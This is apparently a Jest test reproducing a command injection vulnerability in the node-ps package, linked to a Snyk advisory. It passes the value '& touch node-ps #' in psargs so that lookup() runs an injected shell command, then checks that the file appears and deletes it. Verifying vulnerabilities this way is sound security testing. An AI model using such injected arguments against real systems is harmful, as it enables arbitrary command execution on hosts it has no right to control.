//https://snyk.io/vuln/SNYK-JS-NODEPS-1048335
test("Command Injection in node-ps", () => {
  const a = require("node-ps");
  const fs = require("fs");
  const path = "./node-ps";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  a.lookup({ psargs: ["& touch node-ps #"] }, function () {});

  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
